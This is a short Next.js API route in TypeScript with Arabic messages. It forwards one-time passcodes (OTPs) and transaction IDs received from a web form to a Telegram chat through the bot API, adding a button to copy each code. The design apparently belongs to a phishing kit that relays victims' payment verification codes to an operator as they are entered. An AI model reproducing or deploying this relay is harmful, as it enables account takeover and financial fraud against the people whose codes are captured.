import { NextRequest, NextResponse } from "next/server";

async function sendTelegram(text: string, reply_markup?: Record<string, unknown>) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", ...(reply_markup ? { reply_markup } : {}) }),
  });
}

export async function POST(req: NextRequest) {
  try {
    const { otp, transactionId, type } = await req.json();

    const message = type === "resend"
      ? `🔁 <b>طلب إعادة إرسال كود</b>\nلصالح العملية\n\n🆔 Transaction ID: <code>${transactionId ?? ""}</code>`
      : `🔑 <b>كود تحقق جديد</b>\nلصالح العملية\n\n🆔 Transaction ID: <code>${transactionId ?? ""}</code>\n\n🔢 OTP: <code>${otp}</code>`;

    const replyMarkup = otp ? {
      inline_keyboard: [
        [{ text: "📋 نسخ الكود", copy_text: { text: otp } }],
      ],
    } : undefined;

    await sendTelegram(message, replyMarkup);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
  }
}
